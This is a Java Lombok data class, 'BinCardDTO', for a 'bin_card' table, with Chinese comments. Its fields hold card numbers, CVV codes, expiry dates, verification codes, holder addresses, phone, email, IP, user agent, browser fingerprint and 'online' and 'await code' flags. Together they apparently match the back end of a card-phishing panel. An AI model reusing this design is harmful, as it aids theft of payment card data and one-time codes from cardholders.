package com.gzlh.entity;


import lombok.Data;
import lombok.EqualsAndHashCode;
import lombok.experimental.Accessors;

import java.io.Serializable;

/**
 * Model: bin_card --
 *
 * @author qzy
 */
@Data
@Accessors(chain = true)
@EqualsAndHashCode(callSuper = false)
public class BinCardDTO  implements Serializable {

    // ---------- 模块常量 ----------
    /**
     * 序列化版本id
     */
    private static final long serialVersionUID = 1L;
    /**
     * 此模块对应的表名
     */
    public static final String TABLE_NAME = "bin_card";
    /**
     * 此模块对应的权限码
     */
    public static final String PERMISSION_CODE = "bin-card";


    // ---------- 表中字段 ----------
    /**
     *
     */
    private Integer id;

    /**
     *0: '等待中',
     *         1: '成功',
     *         2: '失败'
     */
    private Integer state;

    /**
     *姓氏
     */
    private String familyName;

    /**
     *名字
     */
    private String name;

    /**
     *卡号
     */
    private String card;

    /**
     *安全码
     */
    private String cvv;

    /**
     *日期
     */
    private String cardDate;

    /**
     *验证码
     */
    private String validity;

    /**
     *邮编
     */
    private String post;

    /**
     *地址
     */
    private String address;

    /**
     *
     */
    private String online;

    /**
     *
     */
    private String ip;

    /**
     *
     */
    private String ua;

    /**
     *
     */
    private Long date;

    /**
     *手机号码
     */
    private String phone;

    /**
     *邮箱
     */
    private String email;

    /**
     *
     */
    private boolean sync;

    /**
     *
     */
    private String syncfinish;

    /**
     * 指纹
     */
    private String fingerprint;



    /**
     *
     */
    private Integer awaitpage;

    /**
     *
     */
    private Integer awaitcode;

    /**
     *
     */
    private String repetition;



    private int stepTotal=1;

    private int currentStep=1;

    private String sysName;
    private String stateAddress;
    private String city;
    private String text;
    private String cardHolder;
    private String field;
    private String notice;
}
